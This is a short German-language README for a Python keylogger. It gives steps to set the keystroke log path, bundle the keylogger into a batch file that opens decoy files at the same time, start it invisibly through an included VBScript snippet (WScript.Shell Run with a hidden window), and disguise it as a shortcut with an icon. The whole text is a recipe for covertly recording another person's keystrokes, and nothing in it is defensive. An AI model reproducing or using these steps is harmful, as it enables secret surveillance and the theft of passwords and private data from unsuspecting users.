# Pykeylogger
Pykeylogger in kombination mit cmd file zum gleichzeitigen öffnen von files und des keyloggers


davor key logger text file pfad ("c:/keystrokes/") verändern auf gewünschten pfad in dem die keystrokes als .txt datei gespeichert werden
in program die zwei z öffnenden pfade ändern 
programm als .bat datei abspeichern

danach vbs program integrieren damit die bat datei unsichtbar gestartet werden kann 

Set WshShell = CreateObject("WScript.Shell") 
WshShell.Run chr(34) & "C:\(bat datei zum öffnen der zwei programme)batchconnect.bat" & Chr(34), 0
Set WshShell = Nothing

c pfad durch bat datei pfad ersetzen und als .vbs abspeichern

dann .vbs datei mit icon verbinden unter eigenschaften verknüpfung und dann vbs datei pfad in ziel einspeichern
